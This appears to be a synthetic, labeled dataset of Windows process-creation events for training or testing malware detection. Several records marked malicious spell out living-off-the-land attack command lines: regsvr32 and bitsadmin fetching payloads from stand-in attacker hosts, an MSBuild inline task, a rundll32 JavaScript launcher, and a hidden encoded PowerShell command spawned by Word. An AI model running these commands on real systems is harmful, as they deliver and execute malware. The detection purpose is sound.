    "UtcTime": "2024-07-06T02:19:36.411Z",
    "ProcessGuid": "{9BC882FE-6E85-4ECC-9F3A-B9A1229EF197}",
    "ProcessId": 53730,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe C:\\Users\\Public\\helper630.csproj",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 15803,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T01:20:34.578Z",
    "ProcessGuid": "{DAA877F1-EA35-498D-9C8A-FFEF23532BE6}",
    "ProcessId": 10802,
    "Image": "C:\\Windows\\System32\\wininit.exe",
    "CommandLine": "wininit.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 22419,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:11:18.099Z",
    "ProcessGuid": "{1196433E-FEFD-4D31-9B89-DEC2D52DE0AE}",
    "ProcessId": 31853,
    "Image": "C:\\Users\\itops\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 9384,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T15:30:41.204Z",
    "ProcessGuid": "{AC693A78-3945-43C6-87A4-9DE1BD99253A}",
    "ProcessId": 50539,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net use Z: \\\\fileserver\\share",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 64171,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T19:37:38.040Z",
    "ProcessGuid": "{D90924BA-C791-4B2B-B678-67C6B15ABDB9}",
    "ProcessId": 41591,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 6372,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T18:58:13.751Z",
    "ProcessGuid": "{D6CFEB51-14E0-4A26-88D0-83661CC9221C}",
    "ProcessId": 6059,
    "Image": "C:\\Windows\\System32\\dwm.exe",
    "CommandLine": "dwm.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 48420,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T23:15:06.335Z",
    "ProcessGuid": "{0E496732-2D73-43E2-B08E-115DFAE29E3B}",
    "ProcessId": 34846,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb7336179.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb7336179.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 39166,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T08:18:55.904Z",
    "ProcessGuid": "{BB7C5735-4B37-41C2-A93A-E2E9C52204BE}",
    "ProcessId": 43559,
    "Image": "C:\\Program Files\\nodejs\\node.exe",
    "CommandLine": "node.exe server.js",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 26331,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T21:19:36.135Z",
    "ProcessGuid": "{D936F078-E546-4AF9-88A4-C502AF1D8C1E}",
    "ProcessId": 59869,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c installer593.exe\")",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "explorer.exe",
    "ParentProcessId": 52730,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.011",
    "technique_name": "Rundll32 JavaScript",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T16:29:23.061Z",
    "ProcessGuid": "{E0279CEA-923A-4DF9-ADF6-8F05EB99F633}",
    "ProcessId": 41490,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c netstat -an",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 42794,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:07:47.548Z",
    "ProcessGuid": "{44CD4374-F85B-40C7-A111-8DBD4C33AD0F}",
    "ProcessId": 63316,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 50950,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:32:35.108Z",
    "ProcessGuid": "{EC754A1D-42E4-4D87-BC68-BBDAE86C249F}",
    "ProcessId": 21913,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 16842,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T02:33:09.460Z",
    "ProcessGuid": "{266FC046-65D8-4A60-AA7B-101B3C5797F7}",
    "ProcessId": 20377,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 54701,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:52:40.405Z",
    "ProcessGuid": "{5C90C9E2-4E58-4445-827C-6121457CC4B6}",
    "ProcessId": 8270,
    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
    "CommandLine": "wmic.exe service where state='running' get name,pathname",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 58010,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T21:13:30.398Z",
    "ProcessGuid": "{4FDE7AD3-B188-4B92-AD1E-1DB4542B44BF}",
    "ProcessId": 45659,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 63994,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:35:16.556Z",
    "ProcessGuid": "{A41865FA-DA70-4347-B72A-32F5D5E8473C}",
    "ProcessId": 59588,
    "Image": "C:\\Windows\\System32\\eventvwr.exe",
    "CommandLine": "eventvwr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 36368,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T12:56:28.799Z",
    "ProcessGuid": "{9B52F891-EA23-4F7B-9B6B-98C3B27BC6AA}",
    "ProcessId": 57544,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 62523,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-07T03:38:10.808Z",
    "ProcessGuid": "{BE16B100-A3DC-4DEA-8DB8-3C35F5D638B1}",
    "ProcessId": 53072,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s /n /u /i:http://cobaltstrike987.top/file140.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 42811,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T20:19:50.281Z",
    "ProcessGuid": "{60DF64D8-A1F5-4677-B570-160C335AC7D7}",
    "ProcessId": 39759,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 4681,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:44:22.881Z",
    "ProcessGuid": "{995A3528-751F-4C4B-9555-E996988C00CE}",
    "ProcessId": 47579,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ChildItem -Path C:\\Logs -Recurse -Filter *.log\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 40994,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T02:49:03.943Z",
    "ProcessGuid": "{D9734479-D0EA-4737-9F9F-7BA4B3B6D127}",
    "ProcessId": 51521,
    "Image": "C:\\Windows\\System32\\dwm.exe",
    "CommandLine": "dwm.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 22914,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:29:44.262Z",
    "ProcessGuid": "{B21E07FD-95B0-4E01-AC83-69C1FC3085EC}",
    "ProcessId": 51259,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 25175,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T01:25:12.502Z",
    "ProcessGuid": "{01F598D3-9C47-430D-9CE6-2713F53BC67D}",
    "ProcessId": 21824,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "WINWORD.EXE /n",
    "ParentProcessId": 40529,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T19:43:41.570Z",
    "ProcessGuid": "{6DBFE3BC-AF70-458B-8932-57C9B54EB118}",
    "ProcessId": 2720,
    "Image": "C:\\Windows\\System32\\SearchIndexer.exe",
    "CommandLine": "C:\\Windows\\System32\\SearchIndexer.exe /Embedding",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 40911,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:06:26.933Z",
    "ProcessGuid": "{7CAC05F1-0D4B-4931-9DE3-93F998D392FC}",
    "ProcessId": 39715,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 32632,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T16:56:36.029Z",
    "ProcessGuid": "{7B4A227E-FC5D-4FB7-B7D5-9BEF03E59957}",
    "ProcessId": 12386,
    "Image": "C:\\Users\\admin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 13632,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T13:52:28.104Z",
    "ProcessGuid": "{E6E37AAD-4433-46C3-8427-73FBEB6D5DED}",
    "ProcessId": 41377,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe compmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 57887,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T09:22:55.799Z",
    "ProcessGuid": "{56DE1A01-49E8-4AF4-8FAA-645E881872DA}",
    "ProcessId": 4132,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 57740,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:38:02.457Z",
    "ProcessGuid": "{5817FC10-3D72-4208-A635-C5912C7307FA}",
    "ProcessId": 40176,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 45041,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T02:32:40.116Z",
    "ProcessGuid": "{347B12EE-4E9B-4455-B03C-E13B5415DB1F}",
    "ProcessId": 35773,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 34420,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:51:42.884Z",
    "ProcessGuid": "{17F1261D-EAB7-478D-A293-8D8014A92A08}",
    "ProcessId": 49172,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 54133,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T06:09:42.493Z",
    "ProcessGuid": "{8EA79FAC-1970-4077-B444-93CF73338CA7}",
    "ProcessId": 15696,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 56527,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T19:32:14.417Z",
    "ProcessGuid": "{FA6F86AF-248C-471F-ADEE-25FABEE3DACC}",
    "ProcessId": 8395,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job3133 /download /priority high http://dropper-srv7787.cc/sys604.exe C:\\Users\\Public\\loader690.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 50899,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T16:29:00.377Z",
    "ProcessGuid": "{56A14BA1-F580-4A7A-A694-997B90F1D729}",
    "ProcessId": 14151,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Restart-Service -Name Spooler -Force\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 20109,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T03:43:23.557Z",
    "ProcessGuid": "{A8E49BCB-FC1B-4401-9317-365C02BE40AF}",
    "ProcessId": 60093,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 65083,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T07:55:57.163Z",
    "ProcessGuid": "{4B01FC93-D135-4EB8-AEF5-429AD9F5100E}",
    "ProcessId": 54312,
    "Image": "C:\\Windows\\System32\\SearchIndexer.exe",
    "CommandLine": "C:\\Windows\\System32\\SearchIndexer.exe /Embedding",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 22458,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:48:25.551Z",
    "ProcessGuid": "{6BE77A2B-FCD9-4F9C-B0BF-66A65D9DAA55}",
    "ProcessId": 6318,
    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
    "CommandLine": "wmic.exe os get caption,version,buildnumber",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 52596,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T08:44:48.316Z",
    "ProcessGuid": "{E9AFAE69-C1F4-4619-A561-AA0DB8735C05}",
    "ProcessId": 61393,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 23270,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
